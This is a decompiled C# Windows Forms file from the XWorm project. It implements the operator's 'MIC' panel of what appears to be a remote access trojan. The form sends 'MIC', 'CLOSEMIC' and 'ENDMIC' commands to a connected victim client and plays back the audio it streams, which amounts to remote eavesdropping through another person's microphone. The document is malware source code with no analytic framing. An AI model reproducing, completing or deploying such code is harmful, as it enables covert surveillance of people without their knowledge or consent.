#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Wave;


namespace XWorm;

[DesignerGenerated]
public class MIC : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2ComboBox1")]
	private Guna2ComboBox _Guna2ComboBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	public GClass5 gclass5_0;

	public WaveOut waveOut_0;

	public BufferedWaveProvider bufferedWaveProvider_0;

	[field: AccessedThroughProperty("Label1")]
	public Label Label1
;

	public System.Windows.Forms.Timer Timer1
	;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel1")]
	public ToolStripStatusLabel ToolStripStatusLabel1
	;

	public Guna2ComboBox Guna2ComboBox1
	;

	public Guna2GradientButton Guna2GradientButton1
	;

	[field: AccessedThroughProperty("PictureBox1")]
	public PictureBox PictureBox1
		;

	public MIC()
	{
		base.Load += MIC_Load;
		base.FormClosing += MIC_FormClosing;
		waveOut_0 = new WaveOut();
		bufferedWaveProvider_0 = new BufferedWaveProvider(new WaveFormat(8000, 16, 1));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.MIC));
		this.Label1 = new System.Windows.Forms.Label();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Guna2ComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.StatusStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		base.SuspendLayout();
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.Guna2ComboBox1.SelectedIndexChanged += new System.EventHandler(Guna2ComboBox1_SelectedIndexChanged);
		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Label1.AutoSize = true;
		this.Label1.ForeColor = System.Drawing.Color.Black;
		this.Label1.Location = new System.Drawing.Point(12, 11);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(54, 13);
		this.Label1.TabIndex = 15;
		this.Label1.Text = "Devices : ";
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripStatusLabel1 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 263);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.StatusStrip1.Size = new System.Drawing.Size(348, 22);
		this.StatusStrip1.TabIndex = 16;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel1.Text = "..";
		this.Guna2ComboBox1.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.BorderRadius = 3;
		this.Guna2ComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox1.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox1.ItemHeight = 15;
		this.Guna2ComboBox1.Location = new System.Drawing.Point(12, 27);
		this.Guna2ComboBox1.Name = "Guna2ComboBox1";
		this.Guna2ComboBox1.Size = new System.Drawing.Size(324, 21);
		this.Guna2ComboBox1.TabIndex = 93;
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = XWorm_Resources.Play;
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(12, 221);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(324, 28);
		this.Guna2GradientButton1.TabIndex = 95;
		this.Guna2GradientButton1.Text = "Start";
		this.PictureBox1.Enabled = false;
		this.PictureBox1.Image = (System.Drawing.Image)resources.GetObject("PictureBox1.Image");
		this.PictureBox1.Location = new System.Drawing.Point(12, 54);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(324, 161);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 101;
		this.PictureBox1.TabStop = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(348, 285);
		base.Controls.Add(this.PictureBox1);
		base.Controls.Add(this.Guna2GradientButton1);
		base.Controls.Add(this.Guna2ComboBox1);
		base.Controls.Add(this.Label1);
		base.Controls.Add(this.StatusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "MIC";
		this.Text = "MIC";
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void MIC_Load(object sender, EventArgs e)
	{
		Guna2GradientButton1.PerformClick();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void MIC_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			waveOut_0.Stop();
			waveOut_0?.Dispose();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
		byte[] array = Module0.smethod_6("ENDMIC");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(Guna2GradientButton1.Text, "Start", TextCompare: false) == 0)
			{
				byte[] array = Module0.smethod_6("MIC" + GClass19.string_0 + Guna2ComboBox1.SelectedIndex);
				GClass5 gClass = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					gClass.method_1((byte[])a0);
				}, array);
				Guna2GradientButton1.Text = "Stop";
				Guna2GradientButton1.Image = XWorm_Resources._Stop;
				PictureBox1.Enabled = true;
			}
			else
			{
				byte[] array2 = Module0.smethod_6("CLOSEMIC");
				GClass5 gClass2 = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					gClass2.method_1((byte[])a0);
				}, array2);
				Guna2GradientButton1.Text = "Start";
				Guna2GradientButton1.Image = XWorm_Resources.Play;
				PictureBox1.Enabled = false;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			byte[] array = Module0.smethod_6("CLOSEMIC");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
			Guna2GradientButton1.Text = "Start";
			Guna2GradientButton1.Image = XWorm_Resources.Play;
			PictureBox1.Enabled = false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}
}